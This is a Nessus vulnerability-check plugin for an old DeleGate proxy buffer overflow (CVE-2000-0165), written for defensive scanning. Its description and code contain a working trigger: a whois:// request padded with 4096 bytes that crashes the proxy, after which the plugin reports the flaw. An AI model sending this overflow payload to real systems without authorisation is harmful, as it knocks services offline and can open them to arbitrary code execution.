#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10054);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2000-0165");
 script_bugtraq_id(808);
 script_xref(name:"OSVDB", value:"17141");

 script_name(english:"DeleGate Multiple Function Remote Overflows");
 script_summary(english:"Determines if we can use overflow the remote web proxy"); 
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote application proxy has a buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of the DeleGate proxy server has a remote buffer overflow\n",
     "vulnerability.  This issue can be triggered by issuing the following\n",
     "command :\n\n",
     "  whois://a b 1 AAAA..AAAAA\n\n",
     "A remote attacker could exploit this issue to cause a denial of\n",
     "or execute arbitrary code.\n\n",
     "There are reportedly hundreds of other remote buffer overflow\n",
     "vulnerabilities in this version of DeleGate, though Nessus has not\n",
     "checked for those issues\n"
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/1625.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-02/0099.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of DeleGate."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Firewalls"); 

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl");
 script_require_ports("Services/http_proxy", 8080);

 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/http_proxy");
if(!port) port = 8080;

if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  {
  #
  # Try a harmless request. If the connection is shut, it
  # means that the remote service does not accept to forward whois 
  # queries so we exit
  #
  
  command = string("whois://a b 1 aa\r\n\r\n");
  send(socket:soc, data:command);
  buffer = recv_line(socket:soc, length:4096);
  close(soc);
  if(!buffer)exit(0);
  
  soc2 = open_sock_tcp(port);
  if(soc2)
  {
   command = string("whois://a b 1 ", crap(4096), "\r\n\r\n");
   send(socket:soc2, data:command);
   buffer2 = recv_line(socket:soc2, length:4096);
   close(soc2);
   if(!buffer2)
   {
    soc2 = open_sock_tcp(port);
    if (!soc2)
      security_hole(port); 
   }
  }
 }
}

